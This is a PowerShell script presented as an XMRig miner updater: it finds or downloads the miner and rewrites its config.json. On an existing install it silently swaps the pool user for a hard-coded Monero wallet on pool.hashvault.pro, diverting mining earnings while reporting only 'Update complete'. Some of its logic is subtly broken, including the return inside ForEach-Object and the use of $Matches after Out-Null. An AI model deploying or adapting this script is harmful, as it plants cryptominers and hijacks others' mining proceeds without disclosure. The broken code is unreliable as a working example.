param(
    [Parameter(Mandatory=$true)]
    [string]$Directory
)

if (-not (Test-Path $Directory -PathType Container)) {
    Write-Error "Directory not found: $Directory"
    exit
}
$Dir = Resolve-Path $Directory

# Search for xmrig.exe
function Find-XMRig($Dir) {
    gci $Dir -Recurse -File -Filter "xmrig.exe" | ForEach-Object {
        try {
            $ver = (& $_.FullName --version) -match '\d+\.\d+\.\d+' | Out-Null
            if ($Matches[0]) {
                $configPath = Join-Path $_.DirectoryName "config.json"
                $configLines = if (Test-Path $configPath) { Get-Content $configPath } else { @() }
                return @{Path=$_.FullName; Version=$Matches[0]; Config=$configLines}
            }
        } catch {}
    }
    return $null
}

# Update config.json
function Update-Config($Dir) {
    $cfg = Join-Path $Dir "config.json"
    if (Test-Path $cfg) {
        $json = Get-Content $cfg | ConvertFrom-Json
        if ($json.pools.Count -gt 0) {
            $p = $json.pools[0]
            $p.url = "pool.hashvault.pro:443"
            $p.user = "4AUvAWKacmtPxR6xEYnZPSBZgVuwNtP4iKxsUsXAT9GGjCyrCuVkGhhcSQVxVo3zWDUYWCGMyHfavheUH3Hmjf49MzvBEfu"
            $p.tls = $true
            $p.'tls-fingerprint' = "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
        }
        $json | ConvertTo-Json -Depth 10 | Set-Content $cfg
    }
}

# Download & extract
function Download-XMRig($Asset, $Dest) {
    $file = Join-Path $Dest ([IO.Path]::GetFileName($Asset.url))
    Write-Host "Downloading $file..."
    iwr $Asset.url -OutFile $file
    Write-Host "Extracting..."
    Expand-Archive $file -DestinationPath $Dest -Force
    Remove-Item $file -Force
    $extracted = gci $Dest | Where-Object { $_.PSIsContainer } | Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($extracted) { Update-Config $extracted.FullName }
}

# Fetch latest release
$Latest = iwr "https://api.xmrig.com/1/latest_release" -UseBasicParsing | ConvertFrom-Json
$Assets = $Latest.assets | Where-Object { $_.os -match 'windows' }

$XMRig = Find-XMRig $Dir
if ($XMRig) {
    Write-Host "Found xmrig v$($XMRig.Version) at $($XMRig.Path)"
    $Asset = $Assets | Select-Object -First 1
    Download-XMRig $Asset $Dir
    Write-Host "Update complete."
} else {
    $resp = Read-Host "xmrig.exe not found. Download latest version? [y/N]"
    if ($resp -match '^(y|yes)$') {
        $Asset = $Assets | Select-Object -First 1
        Download-XMRig $Asset $Dir
        Write-Host "Download complete."
    } else {
        Write-Host "Exiting."
    }
}
